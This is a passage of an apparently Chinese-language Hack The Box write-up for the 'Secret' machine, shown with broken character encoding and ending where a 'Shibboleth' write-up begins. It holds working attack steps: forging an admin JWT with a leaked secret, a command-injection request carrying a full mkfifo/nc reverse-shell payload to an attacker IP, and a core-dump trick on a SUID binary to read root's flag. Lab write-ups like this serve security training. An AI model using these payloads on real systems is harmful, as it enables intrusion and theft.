¹ç›®å½•çš„`.env`æ–‡ä»¶ï¼Œå¾—åˆ°äº†ä¸€æ®µtokne\n\n```Plain Text\nconst router = require('express').Router();\nconst verifytoken = require('./verifytoken')\nconst User = require('../model/user');\n\nrouter.get('/priv', verifytoken, (req, res) => {\n Â  // res.send(req.user)\n\n Â   const userinfo = { name: req.user }\n\n Â   const name = userinfo.name.name;\n\n Â   if (name == 'theadmin'){\n Â  Â  Â   res.json({\n Â  Â  Â  Â  Â   role:{\n\n Â  Â  Â  Â  Â  Â  Â   role:\"you are admin\",\n Â  Â  Â  Â  Â  Â  Â   desc : \"{flag will be here}\"\n Â  Â  Â  Â  Â   }\n Â  Â  Â   })\n Â   }\n Â   else{\n Â  Â  Â   res.json({\n Â  Â  Â  Â  Â   role: {\n Â  Â  Â  Â  Â  Â  Â   role: \"you are normal user\",\n Â  Â  Â  Â  Â  Â  Â   desc: userinfo.name.name\n Â  Â  Â  Â  Â   }\n Â  Â  Â   })\n Â   }\n\n})\n\nrouter.use(function (req, res, next) {\n Â   res.json({\n Â  Â  Â   message: {\n\n Â  Â  Â  Â  Â   message: \"404 page not found\",\n Â  Â  Â  Â  Â   desc: \"page you are looking for is not found. \"\n Â  Â  Â   }\n Â   })\n});\n\nmodule.exports = router\n```\né€šè¿‡æŸ¥çœ‹private.jså¾—çŸ¥éªŒè¯é€»è¾‘æ˜¯åªè¦name = theadmin å°±æ˜¯adminè´¦æˆ·ï¼Œé‚£æˆ‘ä»¬æ¥ä¼ªé€ ä¸€ä¸ªJWTä»¤ç‰Œå³å¯\n\nä½¿ç”¨åœ¨çº¿JWTä¿®æ”¹å·¥å…·æˆ–jwt\\_toolsè¿›è¡ŒJWTä»¤ç‰Œä¿®æ”¹éƒ½å¯ä»¥\n\n> https://jwt.io/\n\n\n\n> [https://github.com/ticarpi/jwt\\_tool](https://github.com/ticarpi/jwt_tool)\n\n### **åœ¨çº¿å·¥å…·**\nç„¶åä¼ªé€ ä¸€ä¸ªadminçš„tokenå°±å¯ä»¥äº†\n\n![](Hackthebox-Secret/image7.png)\n\nè¿™é‡Œéœ€è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼ŒæŠŠnameå¤„ä¿®æ”¹ä¸ºtheadminï¼Œç„¶ååœ¨ä¸‹æ–¹æ¡†å†…å¡«å…¥æˆ‘ä»¬åœ¨`.env`è·å–åˆ°çš„tokenå€¼ï¼Œå³å¯ç”Ÿæˆä¸€æ®µæ–°çš„JWTä»¤ç‰Œ\n\n### **JWT\\_Tools**\n```Plain Text\npython3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU\n```\næˆ‘ä»¬ç»§ç»­\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]\nâ””â”€# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"creds\":{\"role\":\"admin\",\"username\":\"theadmin\",\"desc\":\"welcome back admin\"}}\n```\næˆ‘ä»¬å»éªŒè¯ä¸€ä¸‹æ–°çš„JWTä»¤ç‰Œï¼Œå‘ç°å·²ç»æ˜¯adminæƒé™äº†\n\né€šè¿‡åˆ†æprivate.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°å¿…é¡»å°†æ–‡ä»¶åæŒ‡å®šä¸ºå¸¦æœ‰åç§°æ–‡ä»¶çš„getå‚æ•°\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\nâ””â”€# curl 'http://secret.htb/api/logs?file=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"killed\":false,\"code\":128,\"signal\":null,\"cmd\":\"git log --oneline /etc/passwd\"}\n```\nçœ‹ç€æ„Ÿè§‰åƒæ˜¯å‘½ä»¤æ³¨å…¥ï¼Ÿ\n\n## **æ¼æ´åˆ©ç”¨**\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\nâ””â”€# curl 'http://secret.htb/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n\"80bf34c fixed typos ğŸ‰\\n0c75212 now we can view logs from server ğŸ˜ƒ\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\"\n```\nOKï¼Œç¡®è®¤æ¼æ´æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\nç„¶åæ¥ç€æ„é€ ä¸€ä¸ªpayloadæ¥è¿›è¡Œåˆ©ç”¨\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]\nâ””â”€# curl 'http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0'\n{\"killed\":false,\"code\":1,\"signal\":null,\"cmd\":\"git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f\\n\\n\"}\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\ndasith@secret:~/local-web$ whoami&&id\nwhoami&&id\ndasith\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n```\næˆåŠŸè·å–åˆ°ä¸€ä¸ªshell\n\n```Plain Text\ndasith@secret:~/local-web$ cd\ncd\ndasith@secret:~$ ls\nls\nlocal-web  user.txt\ndasith@secret:~$ cat user.txt\ncat user.txt\n2b3b6e0a590097b69da4de9631b570fd\n```\næˆåŠŸè·å–åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## **æƒé™æå‡**\næŸ¥çœ‹ä¸€ä¸‹å½“å‰çš„å¯æ‰§è¡Œæ–‡ä»¶\n\n```Plain Text\nfind / -type f -perm -u=s 2>/dev/null\n```\n```Plain Text\ndasith@secret:~$ find / -type f -perm -u=s 2>/dev/null\nfind / -type f -perm -u=s 2>/dev/null\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/fusermount\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/opt/count\n/snap/snapd/13640/usr/lib/snapd/snap-confine\n/snap/snapd/13170/usr/lib/snapd/snap-confine\n/snap/core20/1169/usr/bin/chfn\n/snap/core20/1169/usr/bin/chsh\n/snap/core20/1169/usr/bin/gpasswd\n/snap/core20/1169/usr/bin/mount\n/snap/core20/1169/usr/bin/newgrp\n/snap/core20/1169/usr/bin/passwd\n/snap/core20/1169/usr/bin/su\n/snap/core20/1169/usr/bin/sudo\n/snap/core20/1169/usr/bin/umount\n/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1169/usr/lib/openssh/ssh-keysign\n/snap/core18/2128/bin/mount\n/snap/core18/2128/bin/ping\n/snap/core18/2128/bin/su\n/snap/core18/2128/bin/umount\n/snap/core18/2128/usr/bin/chfn\n/snap/core18/2128/usr/bin/chsh\n/snap/core18/2128/usr/bin/gpasswd\n/snap/core18/2128/usr/bin/newgrp\n/snap/core18/2128/usr/bin/passwd\n/snap/core18/2128/usr/bin/sudo\n/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/2128/usr/lib/openssh/ssh-keysign\n/snap/core18/1944/bin/mount\n/snap/core18/1944/bin/ping\n/snap/core18/1944/bin/su\n/snap/core18/1944/bin/umount\n/snap/core18/1944/usr/bin/chfn\n/snap/core18/1944/usr/bin/chsh\n/snap/core18/1944/usr/bin/gpasswd\n/snap/core18/1944/usr/bin/newgrp\n/snap/core18/1944/usr/bin/passwd\n/snap/core18/1944/usr/bin/sudo\n/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1944/usr/lib/openssh/ssh-keysign\n```\nè·å–åˆ°äº†ä¸€äº›å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶\n\næˆ‘ä»¬æŠŠç›®å…‰ç€çœ¼æ”¾åœ¨`/opt/count`ä¸Š\n\n```Plain Text\ndasith@secret:/opt$ cat code.c\ncat code.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <dirent.h>\n#include <sys/prctl.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <linux/limits.h>\n\nvoid dircount(const char *path, char *summary)\n{\n Â   DIR *dir;\n Â   char fullpath[PATH_MAX];\n Â   struct dirent *ent;\n Â   struct stat fstat;\n\n Â   int tot = 0, regular_files = 0, directories = 0, symlinks = 0;\n\n Â   if((dir = opendir(path)) == NULL)\n Â   {\n Â  Â  Â   printf(\"\\nUnable to open directory.\\n\");\n Â  Â  Â   exit(EXIT_FAILURE);\n Â   }\n Â   while ((ent = readdir(dir)) != NULL)\n Â   {\n Â  Â  Â   ++tot;\n Â  Â  Â   strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);\n Â  Â  Â   strcat(fullpath, \"/\");\n Â  Â  Â   strncat(fullpath, ent->d_name, strlen(ent->d_name));\n Â  Â  Â   if (!lstat(fullpath, &fstat))\n Â  Â  Â   {\n Â  Â  Â  Â  Â   if(S_ISDIR(fstat.st_mode))\n Â  Â  Â  Â  Â   {\n Â  Â  Â  Â  Â  Â  Â   printf(\"d\");\n Â  Â  Â  Â  Â  Â  Â   ++directories;\n Â  Â  Â  Â  Â   }\n Â  Â  Â  Â  Â   else if(S_ISLNK(fstat.st_mode))\n Â  Â  Â  Â  Â   {\n Â  Â  Â  Â  Â  Â  Â   printf(\"l\");\n Â  Â  Â  Â  Â  Â  Â   ++symlinks;\n Â  Â  Â  Â  Â   }\n Â  Â  Â  Â  Â   else if(S_ISREG(fstat.st_mode))\n Â  Â  Â  Â  Â   {\n Â  Â  Â  Â  Â  Â  Â   printf(\"-\");\n Â  Â  Â  Â  Â  Â  Â   ++regular_files;\n Â  Â  Â  Â  Â   }\n Â  Â  Â  Â  Â   else printf(\"?\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IRUSR) ? \"r\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IWUSR) ? \"w\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IXUSR) ? \"x\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IRGRP) ? \"r\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IWGRP) ? \"w\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IXGRP) ? \"x\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IROTH) ? \"r\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IWOTH) ? \"w\" : \"-\");\n Â  Â  Â  Â  Â   printf((fstat.st_mode & S_IXOTH) ? \"x\" : \"-\");\n Â  Â  Â   }\n Â  Â  Â   else\n Â  Â  Â   {\n Â  Â  Â  Â  Â   printf(\"??????????\");\n Â  Â  Â   }\n Â  Â  Â   printf (\"\\t%s\\n\", ent->d_name);\n Â   }\n Â   closedir(dir);\n\n Â   snprintf(summary, 4096, \"Total entries Â  Â  Â  = %d\\nRegular files Â  Â  Â  = %d\\nDirectories Â  Â  Â  Â  = %d\\nSymbolic links Â  Â   = %d\\n\", tot, regular_files, directories, symlinks);\n Â   printf(\"\\n%s\", summary);\n}\n\nvoid filecount(const char *path, char *summary)\n{\n Â   FILE *file;\n Â   char ch;\n Â   int characters, words, lines;\n\n Â   file = fopen(path, \"r\");\n\n Â   if (file == NULL)\n Â   {\n Â  Â  Â   printf(\"\\nUnable to open file.\\n\");\n Â  Â  Â   printf(\"Please check if file exists and you have read privilege.\\n\");\n Â  Â  Â   exit(EXIT_FAILURE);\n Â   }\n\n Â   characters = words = lines = 0;\n Â   while ((ch = fgetc(file)) != EOF)\n Â   {\n Â  Â  Â   characters++;\n Â  Â  Â   if (ch == '\\n' || ch == '\\0')\n Â  Â  Â  Â  Â   lines++;\n Â  Â  Â   if (ch == ' ' || ch == '\\t' || ch == '\\n' || ch == '\\0')\n Â  Â  Â  Â  Â   words++;\n Â   }\n\n Â   if (characters > 0)\n Â   {\n Â  Â  Â   words++;\n Â  Â  Â   lines++;\n Â   }\n\n Â   snprintf(summary, 256, \"Total characters = %d\\nTotal words Â  Â   = %d\\nTotal lines Â  Â   = %d\\n\", characters, words, lines);\n Â   printf(\"\\n%s\", summary);\n}\n\nint main()\n{\n Â   char path[100];\n Â   int res;\n Â   struct stat path_s;\n Â   char summary[4096];\n\n Â   printf(\"Enter source file/directory name: \");\n Â   scanf(\"%99s\", path);\n Â   getchar();\n Â   stat(path, &path_s);\n Â   if(S_ISDIR(path_s.st_mode))\n Â  Â  Â   dircount(path, summary);\n Â   else\n Â  Â  Â   filecount(path, summary);\n\n Â   // drop privs to limit file write\n Â   setuid(getuid());\n Â   // Enable coredump generation\n Â   prctl(PR_SET_DUMPABLE, 1);\n Â   printf(\"Save results a file? [y/N]: \");\n Â   res = getchar();\n Â   if (res == 121 || res == 89) {\n Â  Â  Â   printf(\"Path: \");\n Â  Â  Â   scanf(\"%99s\", path);\n Â  Â  Â   FILE *fp = fopen(path, \"a\");\n Â  Â  Â   if (fp != NULL) {\n Â  Â  Â  Â  Â   fputs(summary, fp);\n Â  Â  Â  Â  Â   fclose(fp);\n Â  Â  Â   } else {\n Â  Â  Â  Â  Â   printf(\"Could not open %s for writing\\n\", path);\n Â  Â  Â   }\n Â   }\n\n Â   return 0;\n}\n```\nè¿™æ˜¯countçš„æºç ï¼Œé€šè¿‡åˆ†æåå¾—çŸ¥\n\nè¿™é‡Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œä»£ç ä¸­å´©æºƒäº†ï¼ŒæŠ¥å‘Šé€šå¸¸ä¼šä¿å­˜åœ¨`/var/crash`ä¸­\n\nåœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯é€šè¿‡è¿™ä¸ªpemè®¾ç½®`prctl(PR_SET_DUMPABLE, 1);`ï¼Œå®ƒå¯ä»¥è¢«å®ç°\n\nç”±äºå®ƒè®¾ç½®ä¸º1ï¼Œæˆ‘ä»¬å¯ä»¥äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨ï¼Œåˆ©ç”¨çš„è¯éœ€è¦ä¸¤ä¸ªæ¡ä»¶\n\n1. é¦–å…ˆéœ€è¦ç¡®ä¿æœ‰ä¸¤ä¸ªshell\n2. å¯ä»¥å¯¼è‡´å´©æºƒ\n\nç°åœ¨è®©æˆ‘ä»¬å»ç”¨ä¸Šé¢æ¼æ´åˆ©ç”¨çš„æ–¹å¼å†è·å–ä¸€ä¸ªshell\n\n### **Shell 1**\n```Plain Text\ndasith@secret:/$ cd /opt\ncd /opt\ndasith@secret:/opt$ ./count -p\n./count -p\nEnter source file/directory name: /root/root.txt\n/root/root.txt\n\nTotal characters = 33\nTotal words Â  Â   = 2\nTotal lines Â  Â   = 2\nSave results a file? [y/N]: y\ny\n```\næ‰§è¡Œåå»shell 2è®©è¿›ç¨‹å´©æºƒ\n\n### **Shell 2**\n```Plain Text\ndasith@secret:~/local-web$ cd /opt\ncd /opt\ndasith@secret:/opt$ ps -aux | grep count\nps -aux | grep count\nroot Â  Â  Â  Â  862  0.0  0.1 235672  7480 ? Â  Â  Â   Ssl  06:15 Â  0:00 /usr/lib/accountsservice/accounts-daemon\nroot Â  Â  Â   1342  0.0  0.0 Â  2488 Â  516 ? Â  Â  Â   S Â   06:50 Â  0:00 ./count\nroot Â  Â  Â   1435  0.0  0.0 Â  2488 Â  588 ? Â  Â  Â   S Â   06:54 Â  0:00 ./count\ndasith Â  Â   1460  0.0  1.0  52448 41712 ? Â  Â  Â   S Â   07:00 Â  0:00 gdb ./count\ndasith Â  Â   1462  0.0  0.0 Â  2488 Â  600 ? Â  Â  Â   S Â   07:00 Â  0:00 /opt/count\nroot Â  Â  Â   1850  0.0  0.0 Â  2488 Â  592 pts/0 Â   S+ Â  07:41 Â  0:00 ./count -p\ndasith Â  Â   1885  0.0  0.0 Â  2488 Â  524 pts/4 Â   S+ Â  07:43 Â  0:00 ./count -p\ndasith Â  Â   1887  0.0  0.0 Â  6432 Â  740 pts/2 Â   S+ Â  07:44 Â  0:00 grep --color=auto count\ndasith@secret:/opt$ kill -BUS 1885\nkill -BUS 1885\n```\nç„¶åå†å»shell1æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å´©æºƒ\n\n### **Shell 1 ç¬¬äºŒæ¬¡**\n```Plain Text\nPath: Bus error (core dumped)\n```\nå·²ç»çœ‹åˆ°è¿™å¥æç¤ºäº†ï¼Œä½†ä½œä¸ºä¿é™©æˆ‘ä»¬è¿˜æ˜¯å†éªŒè¯ä¸€æ¬¡\n\n```Plain Text\ndasith@secret:/opt$ cd /var/crash\ncd /var/crash\ndasith@secret:/var/crash$ ls -la\nls -la\ntotal 36\ndrwxrwxrwt  2 root Â  root Â   4096 Dec  6 07:44 .\ndrwxr-xr-x 14 root Â  root Â   4096 Aug 13 05:12 ..\n-rw-r-----  1 dasith dasith 28207 Dec  6 07:44 _opt_count.1000.crash\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†é”™è¯¯æ—¥å¿—äº†ï¼Œæ–°å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ç›®å½•ï¼Œç„¶åæŠŠæ–‡ä»¶æ‹·è´è¿‡å»\n\n```Plain Text\ndasith@secret:/var/crash$ mkdir /tmp/lucifiel\nmkdir /tmp/lucifiel\ndasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel\napport-unpack _opt_count.1000.crash /tmp/lucifiel\ndasith@secret:/var/crash$ cd /tmp/lucifiel\ncd /tmp/lucifiel\ndasith@secret:/tmp/lucifiel$ ls -la\nls -la\ntotal 436\ndrwxr-xr-x  2 dasith dasith Â  4096 Dec  6 07:51 .\ndrwxrwxrwt 13 root Â  root Â  Â  4096 Dec  6 07:49 ..\n-rw-r--r--  1 dasith dasith Â  Â   5 Dec  6 07:51 Architecture\n-rw-r--r--  1 dasith dasith 380928 Dec  6 07:51 CoreDump\n-rw-r--r--  1 dasith dasith Â  Â  24 Dec  6 07:51 Date\n-rw-r--r--  1 dasith dasith Â  Â  12 Dec  6 07:51 DistroRelease\n-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ExecutablePath\n-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ExecutableTimestamp\n-rw-r--r--  1 dasith dasith Â  Â   5 Dec  6 07:51 ProblemType\n-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ProcCmdline\n-rw-r--r--  1 dasith dasith Â  Â   4 Dec  6 07:51 ProcCwd\n-rw-r--r--  1 dasith dasith Â  Â  53 Dec  6 07:51 ProcEnviron\n-rw-r--r--  1 dasith dasith Â  2144 Dec  6 07:51 ProcMaps\n-rw-r--r--  1 dasith dasith Â  1336 Dec  6 07:51 ProcStatus\n-rw-r--r--  1 dasith dasith Â  Â   1 Dec  6 07:51 Signal\n-rw-r--r--  1 dasith dasith Â  Â  29 Dec  6 07:51 Uname\n-rw-r--r--  1 dasith dasith Â  Â   3 Dec  6 07:51 UserGroups\n```\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªCoreDumpæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡º\n\n```Plain Text\ndasith@secret:/tmp/lucifiel$ strings CoreDump\nstrings CoreDump\nCORE\nCORE\ncount\n./count -p\nIGISCORE\nCORE\nELIFCORE\n/opt/count\n/opt/count\n/opt/count\n/opt/count\n/opt/count\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/libc-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\n/usr/lib/x86_64-linux-gnu/ld-2.31.so\nCORE\n////////////////\nPath:\nCould\nLINUX\n////////////////\nPath:\nCould\nTUUU\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsetuid\nexit\nreaddir\nfopen\nclosedir\n__isoc99_scanf\nstrncpy\n__stack_chk_fail\nputchar\nfgetc\nstrlen\nprctl\ngetchar\nfputs\nfclose\nopendir\ngetuid\nstrncat\n__cxa_finalize\n__libc_start_main\nsnprintf\n__xstat\n__lxstat\nGLIBC_2.7\nGLIBC_2.4\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nUnable to open directory.\n??????????\nTotal entries Â  Â  Â  = %d\nRegular files Â  Â  Â  = %d\nDirectories Â  Â  Â  Â  = %d\nSymbolic links Â  Â   = %d\nUnable to open file.\nPlease check if file exists and you have read privilege.\nTotal characters = %d\nTotal words Â  Â   = %d\nTotal lines Â  Â   = %d\nEnter source file/directory name:\n%99s\nSave results a file? [y/N]:\nPath:\nCould not open %s for writing\n:*3$\"\nPath: esults a file? [y/N]: words Â  Â   = 2\nTotal lines Â  Â   = 2\noot/root.txt\n1bf72c039cbd58751b38c6916602f537\naliases\nethers\ngroup\ngshadow\nhosts\ninitgroups\nnetgroup\nnetworks\npasswd\nprotocols\npublickey\nservices\nshadow\nCAk[S\nlibc.so.6\n/lib/x86_64-linux-gnu\nlibc.so.6\nuTi7J\n|F:m\n_rtld_global\n__get_cpu_features\n_dl_find_dso_for_object\n_dl_make_stack_executable\n_dl_exception_create\n__libc_stack_end\n_dl_catch_exception\nmalloc\n_dl_deallocate_tls\n_dl_signal_exception\n__tunable_get_val\n__libc_enable_secure\n__tls_get_addr\n_dl_get_tls_static_info\ncalloc\n_dl_exception_free\n_dl_debug_state\n_dl_argv\n_dl_allocate_tls_init\n_rtld_global_ro\nrealloc\n_dl_rtld_di_serinfo\n_dl_mcount\n_dl_allocate_tls\n_dl_signal_error\n_dl_exception_create_format\n_r_debug\n_dl_catch_error\nld-linux-x86-64.so.2\nGLIBC_2.2.5\nGLIBC_2.3\nGLIBC_2.4\nGLIBC_PRIVATE\nsse2\nx86_64\navx512_1\ni586\ni686\nhaswell\nxeon_phi\nlinux-vdso.so.1\ntls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/\n/lib/x86_64-linux-gnu/libc.so.6\n%%%%%%%%%%%%%%%%\n////////////////\nory name:\n%99s\n/root/root.txt\nTotal characters = 33\nTotal words Â  Â   = 2\nTotal lines Â  Â   = 2\ncI,b\nx86_64\n./count\nSHELL=/bin/sh\nversioning=[object Object]\nunstable_restarts=0\ntreekill=true\nenv=[object Object]\nfilter_env=\nnamespace=default\nrestart_time=0\nDB_CONNECT=mongodb://127.0.0.1:27017/auth-web\naxm_options=[object Object]\nvizion_running=false\nPWD=/opt\nLOGNAME=dasith\nPM2_USAGE=CLI\nexec_interpreter=node\nPM2_HOME=/home/dasith/.pm2\nHOME=/home/dasith\nNODE_APP_INSTANCE=0\nLANG=en_US.UTF-8\nLS_COLORS=\npm_id=0\nversion=1.0.0\npm_uptime=1638771355228\nkm_link=false\npm_cwd=/home/dasith/local-web\naxm_monitor=[object Object]\ninstance_var=NODE_APP_INSTANCE\npmx=true\nunique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c\nLESSCLOSE=/usr/bin/lesspipe %s %s\nvizion=true\nusername=dasith\nLESSOPEN=| /usr/bin/lesspipe %s\nwatch=false\nwindowsHide=true\nautomation=true\naxm_actions=\nSHLVL=1\nTOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\nPM2_INTERACTOR_PROCESSING=true\ncreated_at=1633619800035\nmerge_logs=true\npm_pid_path=/home/dasith/.pm2/pids/index-0.pid\nPATH=/usr/bin:/bin\npm_err_log_path=/home/dasith/.pm2/logs/index-error.log\nnode_version=10.19.0\nkill_retry_time=100\nautorestart=true\naxm_dynamic=[object Object]\nnode_args=\nexec_mode=fork_mode\npm_exec_path=/home/dasith/local-web/index.js\nOLDPWD=/\nstatus=launching\nname=index\npm_out_log_path=/home/dasith/.pm2/logs/index-out.log\n_=./count\n./count\nbemX\n__vdso_gettimeofday\n__vdso_time\n__vdso_clock_gettime\n__vdso_clock_getres\n__vdso_getcpu\nlinux-vdso.so.1\nLINUX_2.6\nLinux\nLinux\nAUATS\nA\\A]]\n[A\\M\nA]]I\n[A\\]\n[A\\]\nGCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\n.shstrtab\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_d\n.dynamic\n.note\n.eh_frame_hdr\n.eh_frame\n.text\n.altinstructions\n.altinstr_replacement\n.comment\n```\n```Plain Text\noot/root.txt\n1bf72c039cbd58751b38c6916602f537\n```\nä»ä¸­è·å–åˆ°äº†rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Shibboleth - Hackthebox","url":"/2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/","content":"\n# Hackthebox - Shibboleth\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Shibboleth/a48fa360-1812-49a7-95db-5f89bc794258.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Shibboleth/53473ca2-3a2f-4ff2-8397-6e872df5db57.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.124\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 20:39 